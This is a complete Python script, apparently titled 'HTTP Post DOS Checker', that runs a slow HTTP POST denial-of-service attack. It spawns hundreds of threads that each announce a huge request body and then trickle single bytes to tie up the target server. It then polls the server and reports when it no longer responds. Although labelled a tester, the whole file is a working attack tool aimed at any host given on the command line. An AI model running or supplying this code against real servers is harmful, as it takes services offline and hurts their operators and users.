#!/usr/bin/python

import socket
import threading
import time
import sys

class http_post_dos(threading.Thread):
	target = ""
	port = 0

	_socket = 0

	_running = False

	def __init__(self, target, port):
		self.target = target
		self.port = port

		threading.Thread.__init__(self)

	def stop(self):
		self._running = False

	def run(self):
		try:
			self._running = True
			self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
			self._socket.connect((self.target, self.port))
			self._send_http_post()
			self._socket.close()

		except socket.error as e:
			print e
			

	def _send_http_post(self, pause=10):
		self._socket.send("POST / HTTP/1.1\r\n"
						  "Host: %s\r\n"
						  "User-Agent: XPN HTTP DOS Tester\r\n"
						  "Connection: keep-alive\r\n"
						  "Keep-Alive: 900\r\n"
						  "Content-Length: 100000000\r\n"
						  "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % (self.target))

		i = pause

		while self._running:
			if i == pause:
				self._socket.send("X")
				i = pause

			i += 1 
			time.sleep(1)

def check_http_server(target, port):
	try:
			_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
			_socket.settimeout(5)

			_socket.connect((target, port))

			_socket.send("GET / HTTP/1.1\r\n"
						 "Host: %s\r\n"
						 "User-Agent: XPN HTTP DOS Tester\r\n\r\n" % (target))

			http_data = _socket.recv(1024)

			if len(http_data) == 0:
				return True
			else:
				return False

	except socket.timeout:
		return True

	except socket.error as e:
		print "[!] Error when checking HTTP server [%s]" % (e)

def print_logo():
	print "\n+++++++++++++++++++++++++++++++++++++++++++++++"
	print "+ HTTP Post DOS Checker                       +"
	print "+    created by XPN                           +"
	print "+                                             +"
	print "+    http://xpnsbraindump.blogspot.com        +"
	print "+++++++++++++++++++++++++++++++++++++++++++++++\n\n"

def print_usage():
	print "Usage: %s TARGET_SERVER TARGET_PORT [MAX_THREADS]\n" % (sys.argv[0]) 

def stop_all_workers(workers):
	for worker in workers:
		worker.stop()


if __name__ == "__main__":

	workers = []
	active = True
	x = 0
	target = ""
	port = 80

	print_logo()

	try:
		target = sys.argv[1]
		port = int(sys.argv[2])

		if len(sys.argv) == 4:
			maxthreads = int(sys.argv[3])
		else:
			maxthreads = 300
	except:
		print_usage()
		quit()


	print "Target [%s:%d]" % (target, port)

	print "[!] Spawning %d HTTP blocker threads" % (maxthreads)

	# spawn our threads

	try:

			while x < maxthreads: 
				workers.append( http_post_dos(target, port) )
				workers[-1].start()
				x += 1

	except Exception as e:
		print "[X] Error Spawning HTTP blocker threads [%s]" % (e)
		print "[X] If error is due to threads, try lowering the count"
		stop_all_workers(workers)
		quit()

	print "[!] Spawned all HTTP blocker threads"
	 
	while active:
		try:
			if threading.active_count() == 1:
				print "[!] Finished"
				active = False
			else:
					if check_http_server(target, port):
						print "[/] Server is not responding to requests, DOS attack successful"
					else:
						print "[X] Server still responding to requests, try increasing thread count"

					time.sleep(1)

		except KeyboardInterrupt:
			print "[!] Sending Stop to All Threads"
			stop_all_workers(workers)

				
